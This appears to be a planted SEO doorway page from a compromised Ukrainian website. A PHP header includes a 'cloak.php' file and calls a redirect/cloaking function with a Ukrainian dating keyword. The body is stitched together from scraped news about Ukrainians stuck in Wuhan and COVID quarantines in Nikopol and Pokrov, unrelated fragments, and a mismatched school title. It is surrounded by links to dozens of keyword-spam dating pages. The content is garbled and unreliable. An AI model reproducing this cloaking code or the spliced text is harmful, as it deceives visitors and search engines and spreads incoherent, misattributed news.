<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%b4%d0%be%d0%bc%d0%b0%d1%88%d0%bd%d1%96+%d1%88%d0%b2%d0%b8%d0%b4%d0%ba%d1%96%d1%81%d0%bd%d1%96+%d0%bf%d0%be%d0%b1%d0%b0%d1%87%d0%b5%d0%bd%d0%bd%d1%8f+%d0%94%d0%be%d0%b1%d1%80%d0%be%d0%bf%d1%96%d0%bb%d0%bb%d1%8f+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Світлівська загальноосвітня школа І-ІІІ ступенів Добропільської районної ради Донецької області</title>
	<meta name="description" content="Місто в період — рр. Друга світова війна; Післявоєнний час. 5 Незалежна Україна." />
	<link rel="canonical" href="https://masage.od.ua/img/211/wyx-domashn-shvidksn-pobachennya.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/137/ragu-vikonavch-sluzhbi.php">виконавчі служби знайомств поблизу Іллінці Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/196/tywe-pdklyuchiti-veb-sayt-bobrinets.php">підключити веб-сайт Бобринець Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/398/wag-agentstva-znayomstv.php">агентства знайомств Ямпіль Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/103/lug-vikonavch-pobachennya.php">виконавчі побачення Таврійськ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/184/gucu-shvidksn-znayomstva.php">швидкісні знайомства Канів Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Домашні швидкісні побачення Добропілля Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>

		
			
				<div>Урок географії - Онлайн-уроки для учнів 7-го класу - 18.05.20</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/A-nBe3MERUg' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Мы, конечно, не лошади. Но принцип схож: хорошее самочувствие, настроение и здоровье начинаются во рту, и зубы - первое, что нужно приводить в порядок, когда начинаешь инвестировать в себя. Автор Марина ВоробйоваРаніше ми повідомляли, що до Апокаліпсису на метафізичному годиннику залишилосьв сього секунд. І нагадували, що світ змінюється, конкуренція та інші економічні і соціальні процесу впливають і на Нікополь. Світом шириться новий вірус з Китаю — інфіковано тисячі осіб.</p>
<p>Нещодавно NikopolToday писав про порожні вулиці Китаю, паніку та хаос в країні висхідного сонця. Зараз наші українці в Китаї розповіли про життя в містах, які охопив убивчій коронавірус. В Китаї, який потерпає від смертоносного вірусу nCoV, залишилося чимало українців.</p><strong><a id='x1'></a><h2>Нікополь сьогодні, новини міста, район - </h2></strong><p>Українці виявилися заблокованими в епіцентрі захворювання. Інфографіка від ТСН. Залишити місто не можемо. Дзвонимо в посольство. Кажуть, евакуацію не планують, але ситуація стає все гіршою", - написала у своєму Instagram українка Олександра Волкова, яка виявилася заблокованою в китайському місті Ухань. Саме звідти, на думку посадовців, і поширився смертельний вірус.</p><a id='x2'></a><h3>ГОТОВНІСТЬ НОМЕР ОДИН, ХОЧА І В ЗЕЛЕНІЙ ЗОНІ</h3><p>Тепер він уже вийшов за межі Китаю. Олександра Волкова, Ухань, провінція ХубейОлександра приїхала в Китай по робочій візі і опинилася заблокованою в УханіЯ приїхала 28 листопада на три місяці по робочій візі, працюю моделлю. В кінці лютого вже мала летіти додому. Ми чули про нетипову пневмонію ще з минулого року, але всі китайці були тоді спокійні. Живемо четверо у великому будинку.</p>
<p>Я - єдина українка, з міста Виноградів Закарпатська область , інші - з Росії. І тут буквально в х числах цього місяця клієнти почали скасовувати роботу, всі почали панікувати. У WeChat почали скидати різні повідомлення про вірус, що він дуже небезпечний, почалася глобальна паніка.</p>
<p>Ухань ізолювали, тобто ввели карантин. Почалася паніка, ми почали дзвонити своїм керівникам. Вони кажуть: сидіть вдома і нікуди не виходьте, запасіться про всяк випадок їжею, адже невідомо, коли в магазин завезуть продукти. Олександра каже, що в магазинах продуктів дуже мало, практично немає овочівНа цей момент їжа в магазинах є, але полиці напівпусті. Є крупи, зокрема, рис, мало овочів. Ми сьогодні заходили в продуктовий, залишилися лише редька і часник.</p><a id='x3'></a><h3>Інтернет-провайдери: кого вибрати?</h3><p>Аптеки теж відчинені, але ти не можеш зайти всередину, вхід перегородили столами, тому ти можеш тільки біля входу попросити щось, щоб тобі продали. Вулиці порожні, люди не виходять, центр абсолютно вимер - там немає нікого. Пересуватися між районами не можна, вони ізольовані. Виїхати з міста теж не можеш.</p>
<p>Ми цілими днями сидимо вдома, виходимо лише в магазини. Пусті вулиці багатомільйонного УханюУ нас в районі нічого не відбувається, епіцентр - в центрі. Там переповнені лікарні, багато хворих, не вистачає масок, хаос. В місті взагалі нереально знайти маски - їх немає ні в магазинах, ні в аптеках. Вчора читала у WeChat, що в місті організовують дружини. У випадку хвороби ти маєш спочатку пройти через цю дружину, яка вирішує, йдеш ти в лікарню чи ні.</p>
<p>Адже всі лікарні переповнені. Відкриті лише продуктові магазини. Ми запаслися на майбутнє, адже невідомо, що буде з постачанням. Я дзвонила в українське посольство в Пекіні, поки що про евакуацію мова не йде. Сказали, щоб сиділи вдома і нікуди не виходили - це все.</p>
		
	<p>Якщо буде евакуація, то я готова звідси поїхати. Дмитро Яцковський, Ланьчжоу, провінція ГаньсуЯ поїхав навчатися в Китай на інженера-механіка у році. Сам з Кременчука, що на Полтавщині. Мій товариш, який був на той час у Китаї, запросив мене, потім він же допоміг влаштуватися на навчання. За цей час я вже вивчив китайську мову, планую тут залишитися.</p>
<p>У період Нового року часто на вулицях мало людей, бо всі роз'їжджаються, навіть самі китайці. Тобто це не дивина. В нашому місті вже є зафіксовані хворі. Влада нам порадила без причини не залишати кампус. Його територію закрили, тобто інші люди сюди зайти не можуть. Але я можу виходити і заходити. Всі масові заходи скасували. На вулицях та в магазинах справді всі ходять в масках. У місті всі ходять в маскахЛікарні дійсно переповнені хворими, адже влада закликала людей при мінімальних симптомах звертатися до лікарів.</p>
<p>З продуктами у нас таких проблем як у Вухані немає, я сьогодні прийшов і закупився, продукти доступні. Єдине - порадили нікуди не виїжджати. За тисячу кілометрів від Уханю, в місті Ланьчжоу, проблем з продуктами поки що немає. Хоча коронавірус там вже теж зафіксували. Дуже багато паніки з боку іноземців, які приїхали в цей період до Китаю. Також багато паніки в ЗМІ. Я не читаю новини, але мені постійно дзвонять і питають, що там сталося. Я не побачив якихось кардинальних змін. Єдине - нам сказали, що поки що не буде працювати університет. Іноземні студенти, які тут навчаються, дуже панікують.</p>
<p>Я знаю тут кількох людей - в них ніби почалася справжня лихоманка. Вони поводять себе так, ніби вже й захворіли, просять якісь ліки. Дмитро каже, що на вулицях міста-мільйонника справді дуже мало людей.</p>
		
	<p>Мені страшно, я боюся за своє здоров'я, але при цьому звик вирішувати проблеми тоді, коли вони виникають. Звичайно, я не ходжу ні на які вечірки та масові заходи. ЗМІ України звернулися за коментарем щодо ситуації з евакуацією українців до Міністерства закордонних справ. Відповідь поки що не надійшла. Однак на сайті Посольства України в Китаї є попередження про поширення коронавірусу. У зв'язку з цим дипломати рекомендують:- під час планування подорожі до Китаю чи всередині країни уточнювати епідеміологічну ситуацію в регіоні відвідання й утриматися від поїздки до міста Ухань, в якому є найбільший ризик зараження;- вживати лише належним чином термічно оброблені продукти тваринного походження та рибу- уникати контакту з тваринами живими або мертвими , відвідання ринків із продажу м'яса, цирків, зоопарків, тваринницьких ферм тощо;- не контактувати з людьми з ознаками респіраторних захворювань;- використовувати спеціальні маски для захисту органів дихання;- мити руки із засобами гігієни, особливо після відвідання місць масового скупчення людей та перед прийомом їжі;- користуватись антисептичними засобами на спиртовій основі;- при симптомах, схожих на грип чи ГРВІ, мінімізувати контакти з іншими людьми й невідкладно звернутися до медичного закладу.</p>
<p>Фото BBCРаніше ми писали як важливо вберегти своє здоров'я і вкладати свої гроші саме на це, щоб бути щасливим. До цього ми нагадували, що до кінця всього живого на Землі залишилось кілька хвилин. Як стало відомо NikopolToday, слідом за іншими містами країни, заклади Нікополя і Покрова закривають на карантин.</p><strong><a id='x4'></a><h2>Суспільство</h2></strong><p>Поки українська влада відмовчується, Нікополь і Покров готується до епідемії. Чи варто панікувати нікопольцям? І невже українські туристи привезли вірус із собою з Китаю? Про це NikopolToday терміново передає від Інформатора. Карантин оголосили, як стверджують, через ГРВІ. Діти пробудуть будинку чотирнадцять днів. Батькам нагадують, що за життя і здоров'я дітей під час карантину відповідають вони. Інформація про кількість закритих класів і терміни уточнюються кожен день. Але зрозуміло вже зараз - цифри зростають щомиті. В той час, як також стало відомо про те, що в Києві зафіксували перший випадок захворювання коронавірусів.</p>
<p>У всіх школах Покрова також оголосили карантин! В той же час, з 28 січня всі школи Покрова будуть закриті на карантин. Але дитячі садки продовжать приймати дітей. Вимушені канікули - це міра, яку прийняли, щоб зменшити захворюваність населення по місту Покров і району.</p><strong><a id='x5'></a><h2>Погода у Добропіллі</h2></strong><p>Про це ЗМІ повідомляє з посиланням на сайт міськради Покрова. До 31 січня в Покрові будуть закриті школи і заклади позашкільної освіти. Свою роботу продовжать садки і дошкільні відділення КПК. Виникає питання, чому у всіх школах Нікополя не оголошено карантин, як у Покрові? Чекаємо першого випадку коронавірусу в Нікополі? Фото Інформатор, BBCРаніше ми писали як українці залишились ізольованими у заблокованих через коронавірус містах Китаю. Тому нагадували, що здоров'я вашої родини, друзів - це найбільше щастя в нашому світі, а не гроші. Ми на порозі великих змін, де вже не здивуєшся нічому.</p>
<p>Як вижити у зомбі-апокаліпсис, якщо він все ж таки станеться?</p><img src="https://www.lifecell.ua/uploads/medialibrary/2019/07/480х360_ukr.jpg" alt="Рекомендовані пакети" style="max-width: 480px; max-height: 480px;"/>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/184/wevyz-rayon-zatoki.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/106/ropes-avtomatichne-pdklyuchennya.php">автоматичне підключення Вишневе Україна</a></li><li><a href="https://masage.od.ua/img/133/refyc-vk-znayomstv-horol.php">вік знайомств Хорол Україна</a></li><li><a href="https://masage.od.ua/img/467/lod-50-shvidksn.php">50 + швидкісні знайомства в Носівка Україна</a></li><li><a href="https://masage.od.ua/img/352/coka-agentstva-znayomstv.php">агентства знайомств Олександрія Україна</a></li><li><a href="https://masage.od.ua/img/313/wemup-seryozn-svatannya.php">серйозні сватання в Лохвиця Україна</a></li><li><a href="https://masage.od.ua/img/467/moxuc-znayomstva-z-zhnkoyu.php">знайомства з жінкою Богодухів Україна</a></li><li><a href="https://masage.od.ua/img/103/jyw-nov-sayti.php">нові сайти знайомств у Лохвиця Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#x1'>Нікополь сьогодні, новини міста, район - </a></li>
<li><a href='#x2'>ГОТОВНІСТЬ НОМЕР ОДИН, ХОЧА І В ЗЕЛЕНІЙ ЗОНІ</a></li>
<li><a href='#x3'>Інтернет-провайдери: кого вибрати?</a></li>
<li><a href='#x4'>Суспільство</a></li>
<li><a href='#x5'>Погода у Добропіллі</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/237/hiqys-sayti-znayomstv.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>